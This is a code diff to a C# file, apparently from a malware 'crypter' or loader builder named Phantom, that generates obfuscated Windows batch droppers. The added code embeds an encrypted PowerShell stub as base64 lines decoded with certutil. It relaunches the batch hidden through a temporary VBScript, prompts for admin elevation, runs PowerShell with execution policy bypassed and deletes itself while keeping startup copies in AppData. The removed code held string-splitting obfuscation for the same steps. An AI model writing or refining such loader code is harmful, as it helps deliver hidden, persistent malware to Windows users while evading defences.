@@ -2,85 +2,111 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
-using System.Text.RegularExpressions;
 
 namespace Phantom
 {
     internal class FileGen
     {
-        // Method to create batch file content
         internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, PhantomMain.FileType fileType, Random rng)
         {
-            // Generate a random variable name
-            string RandomSetVarName = Utils.RandomString(20, rng);
-
-            // Generate PowerShell command using CreatePS method from StubGen class
-            string command = StubGen.CreatePS(key, iv, mode, rng);
+            // Generate PowerShell script
+            string psScript = StubGen.CreatePS(key, iv, mode, rng);
             StringBuilder output = new StringBuilder();
 
-            // Start building the batch file content
-            output.AppendLine(@"@echo off");
+            output.AppendLine("@echo off");
+            output.AppendLine("setlocal enableextensions");
 
-            // Generate random variable names
-            string randomvarstr_1 = Utils.RandomString(20, rng);
-            string randomvarstr_2 = Utils.RandomString(20, rng);
-            // Add lines to set a random variable
-            output.AppendLine(@"%!%s%!%e%!%t%!%l%!%o%!%c%!%a%!%l%!% %!%e%!%n%!%a%!%b%!%l%!%e%!%d%!%e%!%l%!%a%!%y%!%e%!%d%!%e%!%x%!%p%!%a%!%n%!%s%!%i%!%o%!%n%!%".Replace(@"!", Utils.RandomString(20, rng)));
-            output.AppendLine(@"set ""x1=s""".Replace(@"x1", randomvarstr_1));
-            output.AppendLine(@"set ""x2=t""".Replace(@"x2", randomvarstr_2));
-            output.AppendLine(@"set ""x3=!x1!e!x2!""".Replace(@"x1", randomvarstr_1).Replace(@"x2", randomvarstr_2).Replace(@"x3", RandomSetVarName));
+            // VBS self-relaunch guard MUST come before admin check
+            // so hidden relaunches skip admin prompt entirely
+            string vbsFile = null;
+            string magicFlag = null;
+            if (hidden)
+            {
+                magicFlag = "_" + Utils.RandomString(3, rng) + "_";
+                vbsFile = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
+                output.AppendLine($"if \"%1\"==\"{magicFlag}\" goto main");
+                output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {vbsFile}");
+                output.AppendLine($"echo s.Run \"cmd /c \"\"%~f0\"\" {magicFlag} %*\", 0, False >> {vbsFile}");
+                output.AppendLine($"wscript {vbsFile}");
+                // Self-delete original batch (not startup copy in AppData)
+                if (selfdelete)
+                {
+                    output.AppendLine("set \"_p=%~dp0\"");
+                    output.AppendLine("if /i \"%_p:AppData=%\"==\"%_p%\" ((goto) 2>nul & del \"%~f0\")");
+                }
+                output.AppendLine("exit /b");
+                output.AppendLine(":main");
+            }
 
-            // If 'runas' flag is set, add code to execute the batch file with elevated privileges
+            // Admin elevation prompt
             if (runas)
             {
-                // Code to execute the batch file with elevated privileges
-                string runascode = @"if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )" + Environment.NewLine + @"cd /d %1";
-                // Obfuscate the 'runascode'
-                var runasobf = Obfuscator.GenCodeBat(runascode, rng, RandomSetVarName, 3);
-                var netfileobf = Obfuscator.GenCodeBat(@"net file > nul 2>&1", rng, RandomSetVarName, 3);
-                // Add obfuscated 'runascode' and 'net file' command to the batch file content
-                output.AppendLine(netfileobf.Item1 + Environment.NewLine + netfileobf.Item2);
-                output.AppendLine(runasobf.Item1 + Environment.NewLine + runasobf.Item2);
+                string elevateFile = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
+                output.AppendLine(">nul 2>&1 net session || goto elevate");
+                output.AppendLine("goto elevate_done");
+                output.AppendLine(":elevate");
+                output.AppendLine($"echo Set s = CreateObject(\"Shell.Application\") > {elevateFile}");
+                output.AppendLine($"echo s.ShellExecute \"%~f0\", \"%*\", \"\", \"runas\", 0 >> {elevateFile}");
+                output.AppendLine($"cscript //nologo {elevateFile}");
+                output.AppendLine($"del {elevateFile} >nul 2>&1");
+                output.AppendLine("exit /b");
+                output.AppendLine(":elevate_done");
             }
 
-            // Prepare command for execution, optionally hiding the window
-            string commandstart = $"-noprofile {(hidden ? @"-windowstyle hidden" : string.Empty)} -ep bypass -command ";
-            // Obfuscate the PowerShell command
-            var obfuscated3 = Obfuscator.GenCodeBat(commandstart + command, rng, RandomSetVarName, 3);
-            output.AppendLine(obfuscated3.Item1);
-            string powershellPath = @"";
-            if (fileType == PhantomMain.FileType.NET64)
-            {
-                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-            }
-            else if (fileType == PhantomMain.FileType.NET86)
-            {
-                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
-            }
-            else if (fileType == PhantomMain.FileType.x64)
-            {
-                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-            }
-            else if (fileType == PhantomMain.FileType.x86)
-            {
-                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
-            }
-            var powershellcallobf = Obfuscator.GenCodeBat(@"""" + powershellPath + @""" ", rng, RandomSetVarName, 3);
-            output.AppendLine(powershellcallobf.Item1 + Environment.NewLine + powershellcallobf.Item2 + obfuscated3.Item2);
+            // Random temp filename for decoded ps1
+            string tmpName = Utils.RandomString(8, rng);
+            string tmpB64 = Utils.RandomString(8, rng);
+            string b64File = $"%TEMP%\\{tmpB64}.b64";
+            string ps1File = $"%TEMP%\\{tmpName}.ps1";
 
-            // If 'selfdelete' flag is set, add code to delete the batch file after execution
+            // Write base64-encoded PS script to a temp .b64 file via echo
+            byte[] psBytes = Encoding.UTF8.GetBytes(psScript);
+            string b64 = Convert.ToBase64String(psBytes);
+
+            // Split base64 into 60-char lines for echo
+            List<string> b64Lines = new List<string>();
+            for (int i = 0; i < b64.Length; i += 60)
+            {
+                int len = Math.Min(60, b64.Length - i);
+                b64Lines.Add(b64.Substring(i, len));
+            }
+
+            // First echo creates file, rest append
+            for (int i = 0; i < b64Lines.Count; i++)
+            {
+                if (i == 0)
+                    output.AppendLine($"echo {b64Lines[i]} > {b64File}");
+                else
+                    output.AppendLine($"echo {b64Lines[i]} >> {b64File}");
+            }
+
+            // certutil decode, then run
+            output.AppendLine($"certutil -decode {b64File} {ps1File} >nul 2>&1");
+
+            string psPath;
+            if (fileType == PhantomMain.FileType.NET64 || fileType == PhantomMain.FileType.x64)
+                psPath = "%systemdrive%\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+            else
+                psPath = "%systemdrive%\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+            string hiddenFlag = hidden ? "-windowstyle hidden " : "";
+            output.AppendLine($"{psPath} -NoProfile {hiddenFlag}-ExecutionPolicy Bypass -File {ps1File} \"%~f0\" %*");
+
+            // Cleanup temp files
+            output.AppendLine($"del {b64File} >nul 2>&1");
+            output.AppendLine($"del {ps1File} >nul 2>&1");
+            if (vbsFile != null)
+                output.AppendLine($"del {vbsFile} >nul 2>&1");
+
+            // Self-delete (skips startup copies in AppData)
             if (selfdelete)
             {
-                // Code to delete the batch file after execution
-                var meltobf = Obfuscator.GenCodeBat(@"(goto) 2>nul & del ""%~f0""", rng, RandomSetVarName, 3);
-                output.AppendLine(meltobf.Item1 + Environment.NewLine + meltobf.Item2);
+                output.AppendLine("set \"_p=%~dp0\"");
+                output.AppendLine("if /i \"%_p:AppData=%\"==\"%_p%\" ((goto) 2>nul & del \"%~f0\")");
             }
 
-            // Add exit command to terminate the batch file
-            var exitobf = Obfuscator.GenCodeBat(@"exit /b", rng, RandomSetVarName, 3);
-            output.Append(exitobf.Item1 + Environment.NewLine + exitobf.Item2);
+            output.AppendLine("exit /b");
 
-            // Return the generated batch file content as a string
             return output.ToString();
         }
     }
